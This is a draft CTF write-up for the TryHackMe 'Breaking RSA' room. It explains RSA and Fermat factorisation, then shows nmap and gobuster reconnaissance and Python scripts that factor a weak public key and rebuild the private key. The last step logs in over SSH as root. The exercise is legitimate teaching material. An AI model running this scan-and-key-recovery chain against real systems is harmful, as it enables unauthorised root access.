---
title: Breaking RSA
date: 2024.02.18 12:37
tags:
  - cybersecurity
  - ctf
  - writeup
  - cryptography
draft: true
---

# [Breaking RSA](https://tryhackme.com/room/breakrsa)

---
A brief overview of RSA

The security of RSA relies on the practical difficulty of factoring the product of two large prime numbers, the "factoring problem". RSA key pair is generated using 3 large positive integers -

|     |                                                                                                                                                                                                               |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| e   | A constant, usually 65537                                                                                                                                                                                     |
| n   | Known as the modulus of public-private key pair. It is a product of 2 large random prime numbers, p and q.`n = p x q`                                                                                         |
| d   | A large positive integer that makes up the private key. It is calculated as,`d = modinv(e, lcm(p - 1, q - 1))`Where `modinv` is the modulus inverse function and `lcm` is the least common multiple function. |

`(e, n)` are public variables and make up the public key. `d` is the private key and is calculated using `p` and `q`. If we could somehow factorize `n` into `p` and `q`, we could then be able to calculate `d` and break RSA. However, factorizing a large number is very difficult and would take some unrealistic amount of time to do so, provided the two prime numbers are **randomly** chosen.

## Introduction

In a recent analysis, it is found that an organization named JackFruit is using a deprecated cryptography library to generate their RSA keys. This library is known to implement RSA poorly. The two randomly selected prime numbers (`p` and `q`) are very close to one another, making it possible for an attacker to generate the private key from the public key using Fermat's Factorization method.

```python file:"fermat.py"
#!/usr/bin/python3

# gmpy2 is a C-coded Python extension module that supports
# multiple-precision arithmetic.
#
# pip install gmpy2
from gmpy2 import isqrt

from math import lcm

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)
    
    # isqrt returns the integer square root of n
    a = isqrt(n)
    
    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a
    
    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break
    
    return a + b, a - b
print(factorize(105327569))
```
  

I suggest using the [pycryptodome](https://pypi.org/project/pycryptodome/) Python library to answer the RSA-related questions below.

---

## Questions

##### How many services are running on the box?  
```bash
nmap -Pn -n -sS --min-rate=5000 -p- $IP -oN allPorts -vv
```
Ports 22(ssh) and 80(http) are open.

##### What is the name of the hidden directory on the web server? (without leading '/')  
```bash
gobuster dir -u http://$IP -w ~/SecLists/Discovery/Web-Content/common.txt -x php,html,txt
/development          (Status: 301) [Size: 178] [--> http://10.10.3.190/development/]
/index.html           (Status: 200) [Size: 384]

curl http://$IP/development/
<html>
<head><title>Index of /development/</title></head>
<body>
<h1>Index of /development/</h1><hr><pre><a href="../">../</a>
<a href="id_rsa.pub">id_rsa.pub</a>                                         13-Aug-2022 09:27                 725
<a href="log.txt">log.txt</a>                                            13-Aug-2022 09:27                 321
</pre><hr></body>
</html>

curl -O http://$IP/development/id_rsa.pub
curl http://$IP/development/log.txt
The library we are using to generate SSH keys implements RSA poorly. The two
randomly selected prime numbers (p and q) are very close to one another. Such
bad keys can easily be broken with Fermat's factorization method.

Also, SSH root login is enabled.

<https://github.com/murtaza-u/zet/tree/main/20220808171808>

---
```

##### What is the length of the discovered RSA key? (in bits)  
```bash
ssh-keygen -lf id_rsa.pub
4096 SHA256:DIqTDIhboydTh2QU6i58JP+5aDRnLBPT8GwVun1n0Co no comment (RSA)
```

##### What are the last 10 digits of n? (where 'n' is the modulus for the public-private key pair)
I created a python enviroment for installing the libraries for this challenge:

```bash
python -m venv venv
source venv/bin/activate
pip install pycryptodome sympy
```

```python file:"get_modulus.py"
# pip install pycryptodome
from Crypto.PublicKey import RSA
id_rsa_pub = ''
with open('id_rsa.pub', 'r') as f:
    id_rsa_pub = f.readline().strip()
public_key = RSA.importKey(id_rsa_pub)
print(f'n = {public_key.n}')
```

```bash
python get_modulus.py | rev | cut -c 1-10 | rev
```

##### Factorize n into prime numbers p and q
```bash
python get_modulus.py >> fermat.py
echo 'p,q = factorize(n)' >> fermat.py
```

##### What is the numerical difference between p and q?  
```bash
echo 'print(p-q)' >> fermat.py
python fermat.py
1502
```

##### Generate the private key using p and q (take e = 65537)
Now that we have the two prime numbers, we can write a python script for calculating the large positive integer that makes up the private key: `d = modinv(e, lcm(p - 1, q - 1))` (you can use `sympy` for doing that). Now the last thing to do is generate the private key, using the library `pycryptodome`. Here's the final script for this challenge:

```python file:"priv_key_gen.py"
#!/usr/bin/env python3

"""
This is a program that generates a private key from a public rsa key.
"""

#!/usr/bin/env python3

# pip install gmpy2 pycryptodome sympy
from gmpy2 import isqrt
from math import lcm
from Crypto.PublicKey import RSA
import sympy
import os

# Fermat's factorization algorithm
def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)
    # isqrt returns the integer square root of n
    a = isqrt(n)
    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a
    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break
    return a+b, a-b


# calculate the modulus (n) from the public key
id_rsa_pub = ''
with open('id_rsa.pub', 'r') as f:
    id_rsa_pub = f.readline().strip()
public_key = RSA.importKey(id_rsa_pub)
n = public_key.n
p,q = factorize(n)
#print(f'p = {p}\nq = {q}\np-q = {p-q}')


# calculate the large positive integer that makes up the private key
e = 65537
d = sympy.mod_inverse(e, sympy.lcm(p-1, q-1))

# Create an RSA key
key = RSA.construct((n, 65537, d))
# Export the private key in PEM format
private_key = key.export_key().decode()
#print(private_key)

with open('id_rsa', 'w') as f:
    f.write(private_key)
# ssh keys must have perm of 600 (u+rw)
os.chmod('id_rsa', 0o600)
```

##### What is the flag?
```bash
ssh -i id_rsa root@$IP cat /root/flag
```
